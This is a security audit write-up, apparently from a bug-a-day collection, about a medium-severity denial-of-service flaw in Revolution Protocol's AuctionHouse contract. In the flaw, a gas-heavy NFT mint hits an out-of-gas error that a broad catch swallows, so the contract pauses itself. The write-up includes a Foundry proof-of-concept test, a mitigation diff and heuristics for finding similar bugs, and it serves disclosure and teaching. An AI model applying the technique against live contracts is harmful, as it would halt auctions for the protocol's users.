# DoS via Gas-Intensive NFT Minting Failing AuctionHouse's Auction Creation

- **Severity**: Medium
- **Source**: [Code4rena](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/195) / [One Bug Per Day](https://www.onebugperday.com/v1/829)
- **Affected Contract**: [AuctionHouse.sol](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol) \& [VerbsToken.sol](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol)
- **Vulnerability Type**: Denial of Service (DoS) via Out-Of-Gas

## Original Bug Description

>## Lines of code
>
>[https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L328](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L328)
>[https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L311-L313](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/AuctionHouse.sol#L311-L313)
>[https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L292-L310](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/d42cc62b873a1b2b44f57310f9d4bbfdd875e8d6/packages/revolution/src/VerbsToken.sol#L292-L310)
>
>## Vulnerability details
>
>Any user can call `AuctionHouse::settleCurrentAndCreateNewAuction` in order to settle the old auction and create a new one. `settleCurrentAndCreateNewAuction` will call `_createAuction`, which code is shown below:
>
>```solidity
>    function _createAuction() internal {
>        // Check if there's enough gas to safely execute token.mint() and subsequent operations
>        require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD, "Insufficient gas for creating auction");
>
>
>        try verbs.mint() returns (uint256 verbId) {
>            uint256 startTime = block.timestamp;
>            uint256 endTime = startTime + duration;
>
>
>            auction = Auction({
>                verbId: verbId,
>                amount: 0,
>                startTime: startTime,
>                endTime: endTime,
>                bidder: payable(0),
>                settled: false
>            });
>
>
>            emit AuctionCreated(verbId, startTime, endTime);
>        } catch {
>            _pause();
>        }
>    }
>```
>
>As we can see, it will try to mint an NFT, but if it fails, it will execute the `catch` clause. Sponsors are already aware that `catch` block would also catch deliberate Out Of Gas exceptions and that is why `require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD)` is present in the code `(MIN_TOKEN_MINT_GAS_THRESHOLD = 750_000)`. However, it is still possible to consume a lot of gas in `verbs.mint` and force the `catch` clause to execute, and, in turn, pause the contract.
>
>In order to see it, let's look at the code of `VerbsToken::mint`:
>
>```solidity
>    function mint() public override onlyMinter nonReentrant returns (uint256) {
>        return _mintTo(minter);
>    }
>```
>
>It will call `_mintTo`:
>
>```solidity
>    function _mintTo(address to) internal returns (uint256) {
>       [...]
>        // Use try/catch to handle potential failure
>        try cultureIndex.dropTopVotedPiece() returns (ICultureIndex.ArtPiece memory _artPiece) {
>            artPiece = _artPiece;
>            uint256 verbId = _currentVerbId++;
>
>
>            ICultureIndex.ArtPiece storage newPiece = artPieces[verbId];
>
>
>            newPiece.pieceId = artPiece.pieceId;
>            newPiece.metadata = artPiece.metadata;
>            newPiece.isDropped = artPiece.isDropped;
>            newPiece.sponsor = artPiece.sponsor;
>            newPiece.totalERC20Supply = artPiece.totalERC20Supply;
>            newPiece.quorumVotes = artPiece.quorumVotes;
>            newPiece.totalVotesSupply = artPiece.totalVotesSupply;
>
>
>            for (uint i = 0; i < artPiece.creators.length; i++) {
>                newPiece.creators.push(artPiece.creators[i]);
>            }
>
>
>            _mint(to, verbId);
>
>
>            [...]
>    }
>```
>
>As can be seen, it performs some costly operations in terms of gas:
>
>- `cultureIndex.dropTopVotedPiece()` may be costly if there are many art pieces in the `MaxHeap` - height of `MaxHeap` is `O(log n)`, where `n` is the number of elements, but `dropTopVotedPiece` may iterate over the entire height and each time it will read and write storage memory, which is expensive
>- `newPiece.metadata = artPiece.metadata;` can be very costly when `artPiece.metadata` is big (currently, it can have an arbitrary size, so this operation may be very costly)
>- `newPiece.creators.push(artPiece.creators[i]);` is writing to `storage` in a loop, which is expensive as well
>
>Although all above mentioned operations could be used in order to cause OOG exception, I will focus only on the third one - as I will show in the PoC section, if `10` creators are specified (which is a reasonable number) and even a small art piece (containing only a short URL and short description), the attack is possible as pushes will consume over `750 000` gas. It shows that the attack can be performed very often - probably in case of majority of auctions that are ready to be started (as many of art pieces will have several creators or slightly longer descriptions).
>
>## Impact
>
>Malicious users will be able to often pause the `AuctionHouse` contract - they don't even need for their art piece to win the voting as the attack will be likely possible even on random art pieces.
>
>Of course, the owner (DAO) will still be able to unpause the contract, but until it does so (the proposal would have to be first created and voted, which takes time), the contract will be paused and impossible to use. The upgrade of `AuctionHouse` contract will be necessary in order to recover.
>
>## Proof of Concept
>
>The test below demonstrates how an attacker can cause `_createAuction` to execute catch clause causing `AuctionHouse` to pause itself when it shouldn't as there is another art piece waiting to be auctioned.
>
>Please put the following test into `AuctionSettling.t.sol` and run it:
>
>```solidity
>    // create an auction with a piece of art with given number of creators and finish it
>    function _createAndFinishAuction() internal
>    {
>        uint nCreators = 10;
>        address[] memory creatorAddresses = new address[](nCreators);
>        uint256[] memory creatorBps = new uint256[](nCreators);
>        uint256 totalBps = 0;
>        address[] memory creators = new address[](nCreators + 1);
>        for (uint i = 0; i < nCreators + 1; i++)
>        {
>            creators[i] = address(uint160(0x1234 + i));
>        }
>
>        for (uint256 i = 0; i < nCreators; i++) {
>            creatorAddresses[i] = address(creators[i]);
>            if (i == nCreators - 1) {
>                creatorBps[i] = 10_000 - totalBps;
>            } else {
>                creatorBps[i] = (10_000) / (nCreators - 1);
>            }
>            totalBps += creatorBps[i];
>        }
>
>        // create the initial art piece
>        uint256 verbId = createArtPieceMultiCreator(
>            "Multi Creator Art",
>            "An art piece with multiple creators", 
>            ICultureIndex.MediaType.IMAGE,
>            "ipfs://multi-creator-art",
>            "",
>            "",
>            creatorAddresses,
>            creatorBps
>        );
>
>        vm.startPrank(auction.owner());
>        auction.unpause();
>        vm.stopPrank();
>
>        uint256 bidAmount = auction.reservePrice();
>        vm.deal(address(creators[nCreators]), bidAmount + 1 ether);
>        vm.startPrank(address(creators[nCreators]));
>        auction.createBid{ value: bidAmount }(verbId, address(creators[nCreators]));
>        vm.stopPrank();
>
>        vm.warp(block.timestamp + auction.duration() + 1); // Fast forward time to end the auction
>
>        // create another art piece so that it's possible to create next auction
>        createArtPieceMultiCreator(
>            "Multi Creator Art",
>            "An art piece with multiple creators", 
>            ICultureIndex.MediaType.IMAGE,
>            "ipfs://multi-creator-art",
>            "",
>            "",
>            creatorAddresses,
>            creatorBps
>        );
>    }
>
>    function testDOS4() public
>    {
>        vm.startPrank(cultureIndex.owner());
>        cultureIndex._setQuorumVotesBPS(0);
>        vm.stopPrank();
>
>        _createAndFinishAuction();
>
>        assert(auction.paused() == false);
>        // 2 900 000 will be enough to perform the attack
>        auction.settleCurrentAndCreateNewAuction{ gas: 2_900_000 }();
>        assert(auction.paused());
>    }
>```
>
>## Tools Used
>
>VS Code
>
>## Recommended Mitigation Steps
>
>Preventing OOG with `MIN_TOKEN_MINT_GAS_THRESHOLD` will not work as, I have shown before, there are at least `3` ways for attackers to boost the amount of gas used in `VerbsToken::mint`.
>
>In order to fix the issue, consider changing `catch` to `catch Error(string memory)` that will not catch OOG exceptions.
>
>## Assessed type
>
>DoS

## Summary

When `AuctionHouse.settleCurrentAndCreateNewAuction()` calls `_createAuction()`, it does:

```solidity
try verbs.mint() returns (uint256 verbId) {
    // success: schedule next auction
} catch {
    _pause();  // pauses on any failure, including OOG
}
```

Because `verbs.mint()` (in `VerbsToken.sol`) performs gas-heavy operations—heap rebalancing, large metadata copies, and looping over multiple creator structs—it can exhaust gas mid-execution. The generic `catch` then pauses the auction house, halting all auctions until manual unpause via governance.

## A Better Explanation (With Simplified Example)

### 🔍 What Happens Under the Hood

1. **`_createAuction()`**
    - Checks pre-call gas:

    ```solidity
    require(gasleft() >= MIN_TOKEN_MINT_GAS_THRESHOLD, "Insufficient gas");
    ```

    - Calls `verbs.mint()`.
2. **`verbs.mint()`** → `_mintTo()` carries out:
    - **Heap pop**: `cultureIndex.dropTopVotedPiece()` rebalances a MaxHeap in O(log n), each swap costing storage reads/writes.
    - **Metadata copy**: `newPiece.metadata = artPiece.metadata` can be arbitrarily large.
    - **Creator pushes**: Looping over up to 10 `CreatorBps { address creator; uint256 bps; }` entries and writing to storage.
    - **NFT mint**: `_mint(to, verbId)`.
3. **Out-Of-Gas Risk**
    - Even with a 750 000 gas pre-check, these combined operations can exceed available gas, causing an OOG exception **after** `require`.
4. **Catch and Self-Pause**
    - Solidity's broad `catch { … }` catches OOG, then calls `_pause()`.
    - AuctionHouse is now paused—no new auctions or bids—until the DAO owner unpauses.

### 🛠 Why This Matters

- **Easy Denial of Service**: Any user can trigger OOG by submitting art with multiple creators or large metadata.
- **Marketplace Disruption**: Auctions stop until governance intervenes, delaying all trading.
- **Recovery Overhead**: Unpause requires a proposal and vote, introducing downtime.

## Vulnerable Code References

```solidity
// AuctionHouse.sol:L328
try verbs.mint() returns (uint256 verbId) {
    // …
} catch {
    _pause();
}
```

```solidity
// VerbsToken.sol:L292-310
function _mintTo(address to) internal returns (uint256) {
    // … costly heap dropTopVotedPiece()
    // … metadata copy
    for (uint i = 0; i < artPiece.creators.length; i++) {
        newPiece.creators.push(artPiece.creators[i]);
    }
    _mint(to, verbId);
    // …
}
```

## Mitigation

Change the `catch` to only handle explicit revert strings, not OOG, so OOG bubbles up and reverts the entire transaction instead of pausing:

```diff
- try verbs.mint() returns (uint256 verbId) {
-     // success path
- } catch {
-     _pause();
- }
+ try verbs.mint() returns (uint256 verbId) {
+     // success path
+ } catch Error(string memory reason) {
+     // handle only explicit reverts
+     _pause();
+ }
```

Alternatively, refactor to pre-validate gas-heavy steps outside the catch, or introduce a separate error flag rather than pausing on all failures.

## Pattern Recognition Notes

- **Look for functions using Solidity's generic `try { ... } catch { ... }` without specifying error types**, especially around NFT minting or auction creation flows.
  - Such broad catches capture **all exceptions**, including **out-of-gas (OOG)** and low-level VM errors.
- **Identify NFT minting routines** that:
  - Perform **storage-heavy operations** in the same transaction as minting.
  - Copy or update large metadata blobs or complex structs (e.g., arrays of creators with share splits).
  - Execute heap or tree data structure manipulations (e.g., priority queues like MaxHeap) that may involve many reads/writes.
  - Loop over multiple contributors, creators, or participants and write each to storage.
- **Highlight presence of "circuit breakers" or pausing behavior inside catch blocks** that get triggered on **any failure** — this can be exploited by forcing expensive computations to fail mid-execution.
- **Watch for pre-gas checks that only check `gasleft()` before expensive calls**, but do not guard against actual gas exhaustion from internal deep computations in called contracts.
- **Flag contracts where the fallback error handling (catch) doesn't differentiate**:
  - Business-logic-driven explicit reverts (e.g., require checks failing).
  - VM-level failures like OOG, stack too deep, or out-of-memory errors.
- **Common signposts in code**:
  - Extensive use of `try/catch` with **unqualified** `catch {}` after minting or auction-related calls.
  - Minting functions containing **complex state modifications involving arrays or nested structs**.
  - Auction or DAO contracts that **automatically pause or halt operations upon any failure detected in minting**.
- **Testing heuristics**:
  - Deploy and run minting functions with artificially **inflated metadata or maximum allowed creators** to simulate gas-heavy scenarios.
  - Attempt to trigger failures by crafting inputs hitting expensive loops or storage writes.
  - Check if failures result in emergency pause or self-imposed DoS.
